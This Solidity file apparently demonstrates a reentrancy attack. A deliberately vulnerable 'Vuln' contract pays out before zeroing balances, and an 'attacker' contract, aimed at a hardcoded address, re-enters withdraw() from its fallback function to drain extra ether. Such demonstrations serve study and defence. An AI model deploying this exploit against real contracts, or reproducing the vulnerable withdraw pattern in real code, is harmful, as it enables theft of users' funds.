pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attacker {
    address owner;
    uint count;
    Vuln vuln = Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));
    
    constructor () public{
       owner = msg.sender;
    }

    function quarter_on_string() payable public{
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function () external payable {
        if(count < 2 ){
            count++;
            vuln.withdraw();
        }
        count=0;
    }
}